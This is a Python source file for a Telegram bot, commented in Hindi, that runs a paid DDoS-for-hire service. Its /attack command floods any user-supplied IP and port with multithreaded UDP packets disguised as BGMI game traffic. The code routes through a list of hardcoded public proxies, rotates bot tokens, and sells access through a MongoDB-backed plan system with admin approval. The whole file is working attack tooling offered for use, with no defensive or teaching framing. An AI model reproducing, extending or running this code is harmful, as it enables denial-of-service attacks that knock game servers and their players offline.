import os
import sys
import json
import time
import socket
import random
import logging
import threading
from datetime import datetime, timedelta

import telebot
import certifi
from pymongo import MongoClient

# ==================== कॉन्फ़िग (Secrets से) ====================
MONGO_URI = os.getenv("MONGO_URI", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
RUNNER_ID = int(os.getenv("RUNNER_ID", "1"))

# 🔥 मल्टी-टोकन (JSON Array)
try:
    BOT_TOKENS = json.loads(os.getenv("BOT_TOKENS", "[]"))
    if not BOT_TOKENS:
        # फॉलबैक – सिंगल टोकन
        fallback = os.getenv("TELEGRAM_TOKEN", "")
        if fallback:
            BOT_TOKENS = [fallback]
        else:
            BOT_TOKENS = ["YOUR_BOT_TOKEN_HERE"]
except:
    BOT_TOKENS = [os.getenv("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")]

# रनर ID के हिसाब से टोकन चुनो
try:
    BOT_TOKEN = BOT_TOKENS[RUNNER_ID - 1] if RUNNER_ID <= len(BOT_TOKENS) else BOT_TOKENS[0]
except:
    BOT_TOKEN = BOT_TOKENS[0]

print(f"🔹 Runner ID: {RUNNER_ID}")
print(f"🔹 Token loaded: {BOT_TOKEN[:10]}... (length: {len(BOT_TOKEN)})")

# ==================== प्रॉक्सी (ऑटो-फेलबैक) ====================
PROXY_LIST = [
    "http://45.155.205.233:3128",
    "http://188.166.101.12:8118",
    "http://159.203.119.56:3128",
    "http://192.111.135.18:4145",
    "http://45.229.72.97:8080",
    "http://103.169.142.114:8080",
    "http://103.152.112.120:8080",
    "http://51.79.77.250:8191",
    "http://45.137.107.235:3128",
    "http://103.167.240.212:8080",
]

proxy_index = (RUNNER_ID - 1) % len(PROXY_LIST)
PROXY_URL = PROXY_LIST[proxy_index]

# ✅ कोशिश करो प्रॉक्सी सेट करने की – फेल होने पर सीधा कनेक्ट
try:
    if PROXY_URL:
        telebot.apihelper.proxy = {'https': PROXY_URL}
        print(f"🌐 Proxy set to: {PROXY_URL}")
except Exception as e:
    print(f"⚠️ Proxy failed ({e}), running without proxy.")
    telebot.apihelper.proxy = None

# ==================== MongoDB ====================
if MONGO_URI:
    try:
        mongo_client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
        db = mongo_client["attack_bot"]
        users_collection = db["users"]
        print("✅ MongoDB Connected")
    except Exception as e:
        print(f"❌ MongoDB Error: {e}")
        db = None
        users_collection = None
else:
    print("⚠️ MONGO_URI not set, running in demo mode (no auth).")
    db = None
    users_collection = None

# ==================== बॉट सेटअप ====================
bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

# ==================== ग्लोबल वेरिएबल्स ====================
THREADS_PER_RUNNER = 10
BLOCKED_PORTS = [443, 8443, 8700, 20000, 17500, 9031, 20002, 20001]
MAX_DURATION = 300
attack_in_progress = False
attack_stop_event = threading.Event()
attack_start_time = 0
attack_duration = 0

# ==================== BGMI पेलोड ====================
def create_bgmi_payload(size=1400):
    header = b'\x00\x00\x00\x00'      # UE4 Magic
    opcode = b'\x01\x00'              # Connect/Query
    filler = random._urandom(max(0, size - len(header) - len(opcode)))
    return header + opcode + filler

PAYLOAD_TYPES = [
    lambda: create_bgmi_payload(1400),
    lambda: create_bgmi_payload(1200),
    lambda: create_bgmi_payload(800),
    lambda: random._urandom(1400),
]

def get_random_payload():
    return random.choice(PAYLOAD_TYPES)()

# ==================== अटैक इंजन ====================
def udp_worker(ip, port, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
        while not stop_event.is_set():
            payload = get_random_payload()
            sock.sendto(payload, (ip, port))
        sock.close()
    except Exception as e:
        pass

def start_attack(ip, port, duration):
    global attack_in_progress, attack_start_time, attack_duration
    attack_in_progress = True
    attack_start_time = time.time()
    attack_duration = duration
    attack_stop_event.clear()

    print(f"💥 Attack started on {ip}:{port} with {THREADS_PER_RUNNER} threads")

    for _ in range(THREADS_PER_RUNNER):
        t = threading.Thread(target=udp_worker, args=(ip, port, attack_stop_event))
        t.daemon = True
        t.start()

    time.sleep(duration)
    stop_attack()

def stop_attack():
    global attack_in_progress
    attack_in_progress = False
    attack_stop_event.set()
    print("🛑 Attack stopped.")

# ==================== यूज़र वेरिफिकेशन ====================
def is_user_approved(user_id):
    if not users_collection:
        return True  # अगर DB नहीं है तो सबको इजाजत (टेस्टिंग के लिए)
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        return False
    valid_until_str = user.get("valid_until")
    if valid_until_str:
        try:
            valid_until = datetime.strptime(valid_until_str, "%Y-%m-%d")
            if datetime.now().date() > valid_until.date():
                users_collection.delete_one({"user_id": user_id})
                return False
        except:
            pass
    return True

# ==================== काउंटडाउन अपडेट ====================
def update_attack_message(chat_id, message_id, target_ip, target_port, duration):
    global attack_in_progress
    last_text = ""
    for remaining in range(duration, -1, -1):
        if not attack_in_progress:
            break
        if remaining == 0:
            text = f"✅ *Attack Completed!*\n🎯 `{target_ip}:{target_port}`"
        else:
            text = (f"🚀 *Attack in Progress*\n"
                    f"🎯 `{target_ip}:{target_port}`\n"
                    f"⏳ `{remaining}`s left\n"
                    f"🧵 {THREADS_PER_RUNNER} threads")
        if text != last_text:
            try:
                bot.edit_message_text(text, chat_id=chat_id, message_id=message_id, parse_mode='Markdown')
                last_text = text
            except Exception as e:
                if "message is not modified" not in str(e):
                    print(f"Edit error: {e}")
        time.sleep(1)

# ==================== 📨 टेलीग्राम कमांड्स ====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    try:
        bot.reply_to(message, "🔥 *BGMI UDP FLOOD BOT ACTIVE*\nSend /attack <IP> <PORT> <DURATION>", parse_mode='Markdown')
        print(f"✅ /start replied to {message.from_user.id}")
    except Exception as e:
        print(f"❌ Start error: {e}")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    global attack_in_progress
    user_id = message.from_user.id
    chat_id = message.chat.id
    print(f"⚡ Attack command received from {user_id}")

    if not is_user_approved(user_id):
        bot.reply_to(message, "🚫 *Access Denied!* Contact Admin.", parse_mode='Markdown')
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "⚠️ *Format:* `/attack <IP> <PORT> <DURATION>`", parse_mode='Markdown')
        return

    ip, port_str, dur_str = args[1], args[2], args[3]
    try:
        port = int(port_str)
        duration = int(dur_str)
    except:
        bot.reply_to(message, "❌ Invalid numbers.")
        return

    if port in BLOCKED_PORTS:
        bot.reply_to(message, f"🔒 Port {port} is blocked.", parse_mode='Markdown')
        return

    if duration > MAX_DURATION:
        bot.reply_to(message, f"⏳ Max {MAX_DURATION}s allowed.", parse_mode='Markdown')
        return

    if attack_in_progress:
        bot.reply_to(message, "⚠️ Attack already running. Use /stop.", parse_mode='Markdown')
        return

    # ✅ अटैक शुरू
    sent = bot.send_message(chat_id, f"🚀 *Starting attack on {ip}:{port} for {duration}s*", parse_mode='Markdown')
    
    # अपडेटर थ्रेड
    threading.Thread(target=update_attack_message, args=(chat_id, sent.message_id, ip, port, duration), daemon=True).start()
    
    # अटैक थ्रेड
    threading.Thread(target=start_attack, args=(ip, port, duration), daemon=True).start()

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global attack_in_progress
    if attack_in_progress:
        stop_attack()
        bot.reply_to(message, "🛑 *Attack stopped.*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ No attack running.")

@bot.message_handler(commands=['when'])
def when_cmd(message):
    if attack_in_progress:
        elapsed = time.time() - attack_start_time
        remaining = attack_duration - elapsed
        bot.reply_to(message, f"⏳ Remaining: `{int(max(0, remaining))}` seconds", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ No attack in progress.")

@bot.message_handler(commands=['myinfo'])
def myinfo_cmd(message):
    user_id = message.from_user.id
    if not users_collection:
        bot.reply_to(message, "ℹ️ DB not configured. Running in demo mode.")
        return
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        bot.reply_to(message, "⚠️ No account found. Contact admin.", parse_mode='Markdown')
        return
    plan = user.get("plan", "N/A")
    valid_until = user.get("valid_until", "N/A")
    bot.reply_to(message, f"👤 *ID:* `{user_id}`\n📋 *Plan:* `{plan}`\n📅 *Valid Till:* `{valid_until}`", parse_mode='Markdown')

# ==================== 👑 एडमिन कमांड्स ====================
@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Admin only.")
        return
    if not users_collection:
        bot.reply_to(message, "❌ DB not connected.")
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "⚠️ `/approve <user_id> <days>`")
        return
    try:
        target_id = int(args[1])
        days = int(args[2])
    except:
        bot.reply_to(message, "❌ Invalid.")
        return
    valid_until = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    users_collection.update_one(
        {"user_id": target_id},
        {"$set": {"user_id": target_id, "plan": 1, "valid_until": valid_until, "approved_by": ADMIN_ID}},
        upsert=True
    )
    bot.reply_to(message, f"✅ User `{target_id}` approved for {days} days.", parse_mode='Markdown')

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Admin only.")
        return
    if not users_collection:
        bot.reply_to(message, "❌ DB not connected.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "⚠️ `/disapprove <user_id>`")
        return
    try:
        target_id = int(args[1])
    except:
        bot.reply_to(message, "❌ Invalid.")
        return
    users_collection.delete_one({"user_id": target_id})
    bot.reply_to(message, f"🗑 User `{target_id}` removed.", parse_mode='Markdown')

# ==================== 🚀 पोलिंग स्टार्ट ====================
if __name__ == "__main__":
    print("🤖 Bot is starting polling...")
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=20)
    except Exception as e:
        print(f"❌ Polling crashed: {e}")
        time.sleep(5)
